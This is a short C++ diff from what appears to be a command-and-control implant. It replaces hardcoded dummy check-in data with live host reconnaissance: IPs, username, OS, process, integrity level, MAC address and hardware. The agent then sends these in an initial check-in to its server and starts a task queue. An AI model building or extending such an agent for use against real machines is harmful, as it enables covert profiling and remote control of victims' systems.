@@ -76,41 +76,13 @@ std::string Agent::GetUser() const
 
 int main(int argc, char *argv[])
 {
-    LPWSTR username;
+
     AgentModule agentMod;
-    double free, total;
-    agentMod.GetCpuCount();
-    agentMod.GetTotalDiskSize(&total, &free);
-    agentMod.GetRAM();
-    agentMod.GetOSVersion();
-    agentMod.GetMotherBoard();
-    agentMod.GetExternalViaDNS();
-    agentMod.GetInternalIP();
-    agentMod.GetUsername(&username);
-    agentMod.GetMachineMacAddress();
-    std::vector<ResultRequest> taskResults;
     TaskQueueManager taskManager;
     CommManager manager = CommManager();
 
-    IntitalCheckinRequest dummyData = {
-    "192.168.1.101",          // internalIP
-    "203.0.113.45",           // externalIP (example public IP)
-    "Windows 11 Pro",         // OS
-    "testuser",               // user
-    "exampleProcess.exe",     // processName
-    4567,                     // PID
-    "High",                   // integrity (could be Low/Medium/High)
-    "00:1A:2B:3C:4D:5E",      // macAddress
-    "ASUS PRIME Z590-A",      // motherboard
-    16,                       // RAM in GB
-    512.0,                    // diskSize in GB
-    320.5,                    // FreeDisk in GB
-    8                         // CPUCount
-    };
-
-    // Call InitialCheckinRequest
-    // Stores the callbackUUID
-    manager.IntialCheckin(dummyData.StructToJson());
+    IntitalCheckinRequest intialRequest = agentMod.GetHostInformation();
+    manager.IntialCheckin(intialRequest.StructToJson());
     Agent agent;
     agent.Init();
 
